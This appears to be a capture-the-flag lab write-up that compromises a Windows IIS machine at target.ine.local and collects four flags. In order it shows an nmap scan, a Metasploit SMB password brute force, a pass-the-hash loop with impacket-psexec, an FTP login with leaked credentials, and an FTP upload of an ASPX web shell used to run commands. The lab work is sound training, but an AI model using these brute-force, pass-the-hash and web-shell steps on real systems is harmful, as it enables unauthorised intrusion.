# Enumeration
## Nmap
```shell
nmap -sV -sC -A -T4 target.ine.local

	PORT      STATE SERVICE            VERSION
	
	21/tcp    open  ftp                Microsoft ftpd
	| ftp-syst: 
	|_  SYST: Windows_NT
	
	80/tcp    open  http               Microsoft IIS httpd 8.5
	|_http-title: IIS Windows Server
	|_http-server-header: Microsoft-IIS/8.5
	| http-methods: 
	|_  Potentially risky methods: TRACE
	
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	
	3389/tcp  open  ssl/ms-wbt-server?
	|_ssl-date: 2025-05-13T13:09:56+00:00; 0s from scanner time.
	| ssl-cert: Subject: commonName=WIN-M878Q9NE9S6
	| Not valid before: 2025-01-08T05:31:54
	|_Not valid after:  2025-07-10T05:31:54
	| rdp-ntlm-info: 
	|   Target_Name: WIN-M878Q9NE9S6
	|   NetBIOS_Domain_Name: WIN-M878Q9NE9S6
	|   NetBIOS_Computer_Name: WIN-M878Q9NE9S6
	|   DNS_Domain_Name: WIN-M878Q9NE9S6
	|   DNS_Computer_Name: WIN-M878Q9NE9S6
	|   Product_Version: 6.3.9600
	|_  System_Time: 2025-05-13T13:09:49+00:00
	
	49152/tcp open  msrpc              Microsoft Windows RPC
	49153/tcp open  msrpc              Microsoft Windows RPC
	49154/tcp open  msrpc              Microsoft Windows RPC
	49155/tcp open  msrpc              Microsoft Windows RPC
	
	Network Distance: 3 hops
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2025-05-13T13:09:50
	|_  start_date: 2025-05-13T13:05:37
	| smb2-security-mode: 
	|   3:0:2: 
	|_    Message signing enabled but not required
	
	TRACEROUTE (using port 80/tcp)
	HOP RTT     ADDRESS
	1   0.04 ms ap-south-18 (10.10.47.1)
	2   ...
	3   2.19 ms target.ine.local (10.5.28.8)
# 
```

## SMB bruteforce
```shell
# user is tom
# wordlist : - /usr/share/wordlists/metasploit/unix_passwords.txt

# metasploit
use scanner/smb/smb_login
set rhosts target.ine.local
set threads 10
set verbose false
set SMBuser tom
set createsession true
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
run
	[+] 10.5.28.8:445         - 10.5.28.8:445 - Success: '.\tom:felipe'
```
*user found :* tom
*pass found:* felipe
#### session
```shell
shares
shares -i 3
cat flag1.txt
	e300e1ba41c44bb6a77b023eaa9f035c

download leaked-hashes.txt
	[+] Downloaded leaked-hashes.txt to leaked-hashes.txt
```

## ntlm hash bruteforce
have user : `nancy`
```shell
# impacket-psexec nancy@target.ine.local -hashes $hash
# for hash in $(cat leaked-hashes.txt);do echo $hash ;done 
for hash in $(cat leaked-hashes.txt);do echo $hash; impacket-psexec nancy@target.ine.local -hashes $hash ;done

# automated
# user smb_login as first used and place hashed wordlists in pass_file
	[+] 10.5.28.8:445         - 10.5.28.8:445 - Success: '.\nancy:aad3b435b51404eeaad3b435b51404ee:b3ddea4b4b957f3e037af75cfe5317ad'

cat flag2.txt
dfd63a7c72f3402aa38e8d55cceef23e

get hint.txt
Who knows, these creds might come handy! ---> david:omnitrix_9901

```

## try to log in ftp via cred
creds by hint.txt
```shell
ftp target.ine.local
Connected to target.ine.local.
220 Microsoft FTP Service
Name (target.ine.local:root): david
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49249|)
125 Data connection already open; Transfer starting.
06-13-24  10:36AM       <DIR>          aspnet_client
05-13-25  02:05PM                   34 flag3.txt
06-13-24  10:34AM                99710 iis-85.png
06-13-24  10:34AM                  701 iisstart.htm
226 Transfer complete.

ftp> more flag3.txt
7aaf615278ef46d4976287c452711cc9
```

## compromise machine via ftp
```shell
#copy webshell to /root/
cp /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx 
# log in ftp (privious task)
# creds : david:omnitrix_9901
ftp> put cmdasp.aspx

# thats it
# now browse http://target.ine.local/cmdasp.aspx
	whoami
	type C:\\flag4.txt
	7179df0cd6134dac9fcd34fef954edff
```

